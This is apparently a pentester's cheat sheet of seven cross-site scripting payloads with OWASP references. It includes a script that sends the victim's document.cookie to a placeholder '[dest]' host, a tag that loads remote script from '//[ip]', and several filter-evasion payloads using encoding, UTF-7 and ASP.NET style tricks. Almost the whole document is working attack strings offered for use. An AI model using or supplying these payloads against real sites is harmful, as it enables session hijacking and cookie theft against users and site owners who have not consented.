### 1. Grab the cookie
```
<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>
```
**- web application,XSS,cookies**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://excess-xss.com/
__________
### 2. .net xss filter evasion
```
<%div style="xss:expression(alert(123))">
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 3. .net xss filter evasion
```
<IMG SRC=j&#X41vascript:alert('test2')>
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 4. UTF7 xss
```
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 5. mini xss
```
<script src=//[ip]>
```
**- web application,XSS**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
__________
### 6. JSFiddle skele
```
https://jsfiddle.net/byf89m43/2/
```
**- web application,XSS**
#### References:

http://stackoverflow.com/questions/17382200/print-var-in-jsfiddle
__________
### 7. Asp.net filter evasion
```
<% style=behavior:url(: onreadystatechange=alert(1)>
```
**- web application,XSS**
#### References:

https://prezi.com/sfiyqpfngyor/xss-stylebehavior-urlhttphackersorgxsshtc/
http://blog.innerht.ml/cascading-style-scripting/
__________
